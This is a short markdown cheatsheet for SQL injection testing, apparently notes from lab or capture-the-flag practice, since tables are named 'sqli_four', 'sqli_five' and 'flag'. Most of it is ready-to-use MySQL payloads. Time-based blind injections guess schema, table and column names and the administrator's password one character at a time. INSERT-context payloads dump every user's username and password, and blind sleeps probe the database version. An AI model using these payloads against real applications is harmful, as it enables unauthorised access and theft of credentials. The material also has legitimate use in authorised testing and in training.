# SQL Injection Cheatsheet

- [ ] Look for any endpoint/functionality that seems like it is touching the DB
	- Try injecting a single or double quote and look for changes in response
	- Try adding comments on login forms to bypass authentication
	- Try to enumerate the database type and version
- [ ] Check if you can trigger an error
	- Visible errors
	- Conditional errors (e.g., divide by zero)
- [ ] Check if you can trigger a conditional response
- [ ] Try to trigger a time delay
	- sleep
	- Examples:
		- `test@test.com' and 1=sleep(3);-- -`
		- `' or 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--`
		- `' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--`
		- `' and (SELECT sleep(3) from information_schema.COLUMNS where TABLE_SCHEMA = 'sqli_four' and TABLE_NAME = 'users' and COLUMN_NAME like 'u%' LIMIT 1);--+-`
		- `' AND 1=(SELECT sleep(3) FROM users WHERE username = 'administrator' AND password like 'a%' LIMIT 1);-- -`

- [ ] Look for any input fields that may be inserting rows into the database and check those for injection as well. 

	!!! warning
		Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.

	- Examples
		- `title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--`
		- `title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--`
		- `title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--`
	- Blind insert examples
		- `test',sleep(5),'');-- -`
		- `',( select sleep(5) where version() like '8%' ) ,'');--`
		- `',( select sleep(5) from flag where flag like 'a%' ),'');--`
